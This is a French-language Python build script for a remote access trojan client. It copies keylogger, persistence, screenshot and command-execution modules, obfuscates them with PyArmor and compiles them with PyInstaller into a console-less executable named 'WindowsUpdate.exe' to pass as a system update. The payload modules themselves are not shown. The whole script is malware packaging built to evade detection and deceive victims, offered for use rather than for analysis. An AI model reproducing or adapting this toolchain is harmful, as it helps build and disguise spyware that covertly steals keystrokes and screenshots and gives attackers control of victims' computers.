"""
Script de build pour créer un exécutable client obfusqué avec PyArmor
"""

import os
import sys
import shutil
import subprocess
from pathlib import Path

class ClientBuilder:
    def __init__(self):
        self.project_dir = Path(__file__).parent
        self.dist_dir = self.project_dir / "dist"
        self.build_dir = self.project_dir / "build"
        self.obfuscated_dir = self.project_dir / "obfuscated"
        
    def check_dependencies(self):
        """Vérifier que PyArmor et PyInstaller sont installés"""
        print("🔍 Vérification des dépendances...")
        
        try:
            import pyarmor
            print("✅ PyArmor installé")
        except ImportError:
            print("❌ PyArmor non installé")
            print("   Installation: pip install pyarmor")
            return False
        
        try:
            import PyInstaller
            print("✅ PyInstaller installé")
        except ImportError:
            print("❌ PyInstaller non installé")
            print("   Installation: pip install pyinstaller")
            return False
        
        return True
    
    def clean_directories(self):
        """Nettoyer les répertoires de build précédents"""
        print("\n🧹 Nettoyage des anciens builds...")
        
        dirs_to_clean = [self.dist_dir, self.build_dir, self.obfuscated_dir]
        for directory in dirs_to_clean:
            if directory.exists():
                shutil.rmtree(directory)
                print(f"   Supprimé: {directory.name}")
        
        # Créer le dossier obfuscated
        self.obfuscated_dir.mkdir(exist_ok=True)
    
    def obfuscate_with_pyarmor(self):
        """Obfusquer le code avec PyArmor"""
        print("\n🔐 Obfuscation du code avec PyArmor...")
        
        # Fichiers à obfusquer
        files_to_obfuscate = [
            "client.py",
            "client_identity_manager.py",
            "persistence.py",
            "process_manager.py",
            "keylogger.py",
            "screenshotManager.py",
            "commandExecutor.py",
            "System_info.py",
            "Network_info.py",
            "Os_info.py",
            "User_info.py",
            "Architecture_info.py",
            "Privileges_info.py",
            "encryptor.py",
            "protocol.py"
        ]
        
        # Créer un dossier temporaire pour les fichiers à obfusquer
        temp_src = self.obfuscated_dir / "src"
        temp_src.mkdir(exist_ok=True)
        
        # Copier les fichiers
        print("   Copie des fichiers...")
        for file in files_to_obfuscate:
            src_file = self.project_dir / file
            if src_file.exists():
                shutil.copy(src_file, temp_src / file)
                print(f"   ✓ {file}")
        
        # Copier config.py (sans obfuscation pour faciliter les modifications)
        shutil.copy(self.project_dir / "config.py", temp_src / "config.py")
        
        # Commande PyArmor avec protection avancée
        print("\n   Lancement de l'obfuscation...")
        
        pyarmor_cmd = [
            "pyarmor",
            "gen",
            "--output", str(self.obfuscated_dir / "dist"),
            "--pack", "onefile",  # Empaqueter en un seul fichier
            "--restrict",  # Restreindre l'importation
            "--enable-jit",  # Activer la compilation JIT pour plus de performance
            str(temp_src / "client.py")
        ]
        
        try:
            result = subprocess.run(
                pyarmor_cmd,
                cwd=self.project_dir,
                capture_output=True,
                text=True
            )
            
            if result.returncode == 0:
                print("✅ Obfuscation réussie!")
            else:
                print(f"❌ Erreur d'obfuscation: {result.stderr}")
                return False
        except Exception as e:
            print(f"❌ Erreur lors de l'obfuscation: {e}")
            return False
        
        return True
    
    def create_pyinstaller_spec(self):
        """Créer un fichier spec PyInstaller personnalisé"""
        print("\n📝 Création du fichier spec PyInstaller...")
        
        spec_content = '''# -*- mode: python ; coding: utf-8 -*-

block_cipher = None

a = Analysis(
    ['obfuscated/dist/client.py'],
    pathex=[],
    binaries=[],
    datas=[
        ('obfuscated/dist/pyarmor_runtime_000000', 'pyarmor_runtime_000000'),
    ],
    hiddenimports=[
        'pynput',
        'pynput.keyboard',
        'pynput.mouse',
        'requests',
        'Crypto',
        'Crypto.Cipher',
        'Crypto.Cipher.AES',
        'PIL',
        'PIL.Image',
        'mss',
        'psutil',
        'socket',
        'platform',
        'subprocess',
        'win32gui',
        'win32con',
        'win32api',
        'win32process',
    ],
    hookspath=[],
    hooksconfig={},
    runtime_hooks=[],
    excludes=[],
    win_no_prefer_redirects=False,
    win_private_assemblies=False,
    cipher=block_cipher,
    noarchive=False,
)

pyz = PYZ(a.pure, a.zipped_data, cipher=block_cipher)

exe = EXE(
    pyz,
    a.scripts,
    a.binaries,
    a.zipfiles,
    a.datas,
    [],
    name='WindowsUpdate',
    debug=False,
    bootloader_ignore_signals=False,
    strip=False,
    upx=True,
    upx_exclude=[],
    runtime_tmpdir=None,
    console=False,  # Pas de console
    disable_windowed_traceback=False,
    argv_emulation=False,
    target_arch=None,
    codesign_identity=None,
    entitlements_file=None,
    icon=None,  # Ajouter un icon='icon.ico' si vous avez un icône
    version_file=None,
)
'''
        
        spec_file = self.project_dir / "client.spec"
        with open(spec_file, 'w', encoding='utf-8') as f:
            f.write(spec_content)
        
        print("✅ Fichier spec créé")
        return spec_file
    
    def build_executable(self, spec_file):
        """Compiler avec PyInstaller"""
        print("\n🔨 Compilation avec PyInstaller...")
        
        pyinstaller_cmd = [
            "pyinstaller",
            "--clean",
            "--noconfirm",
            str(spec_file)
        ]
        
        try:
            result = subprocess.run(
                pyinstaller_cmd,
                cwd=self.project_dir,
                capture_output=True,
                text=True
            )
            
            if result.returncode == 0:
                print("✅ Compilation réussie!")
                return True
            else:
                print(f"❌ Erreur de compilation: {result.stderr}")
                return False
        except Exception as e:
            print(f"❌ Erreur lors de la compilation: {e}")
            return False
    
    def finalize_build(self):
        """Finaliser le build"""
        print("\n📦 Finalisation...")
        
        exe_path = self.dist_dir / "WindowsUpdate.exe"
        
        if exe_path.exists():
            size_mb = exe_path.stat().st_size / (1024 * 1024)
            print(f"\n✅ BUILD RÉUSSI!")
            print(f"   Fichier: {exe_path}")
            print(f"   Taille: {size_mb:.2f} MB")
            print(f"\n🚀 L'exécutable est prêt à être déployé!")
            return True
        else:
            print("❌ Le fichier exécutable n'a pas été créé")
            return False
    
    def build(self):
        """Processus complet de build"""
        print("="*60)
        print("🏗️  BUILD CLIENT RAT - OBFUSQUÉ ET COMPILÉ")
        print("="*60)
        
        # Vérifier les dépendances
        if not self.check_dependencies():
            print("\n❌ Dépendances manquantes. Installez-les et réessayez.")
            return False
        
        # Nettoyer
        self.clean_directories()
        
        # Obfusquer
        if not self.obfuscate_with_pyarmor():
            print("\n❌ Échec de l'obfuscation")
            return False
        
        # Créer le spec
        spec_file = self.create_pyinstaller_spec()
        
        # Compiler
        if not self.build_executable(spec_file):
            print("\n❌ Échec de la compilation")
            return False
        
        # Finaliser
        return self.finalize_build()


def main():
    builder = ClientBuilder()
    
    # Demander confirmation
    print("\n⚠️  ATTENTION: Ce build va créer un exécutable obfusqué.")
    print("    Assurez-vous que config.py contient les bonnes informations.")
    
    response = input("\n   Continuer? (o/N): ").strip().lower()
    
    if response != 'o':
        print("\n❌ Build annulé")
        return
    
    success = builder.build()
    
    if success:
        print("\n" + "="*60)
        print("✅ BUILD TERMINÉ AVEC SUCCÈS!")
        print("="*60)
        print("\n📁 Fichiers générés:")
        print(f"   • dist/WindowsUpdate.exe  (Exécutable final)")
        print(f"   • obfuscated/             (Code obfusqué)")
        print(f"   • build/                  (Fichiers temporaires)")
        print("\n⚠️  IMPORTANT:")
        print("   • L'exe est obfusqué avec PyArmor")
        print("   • Ne partagez pas les fichiers de build")
        print("   • Testez dans un environnement isolé d'abord")
    else:
        print("\n❌ Le build a échoué")
        sys.exit(1)


if __name__ == "__main__":
    main()
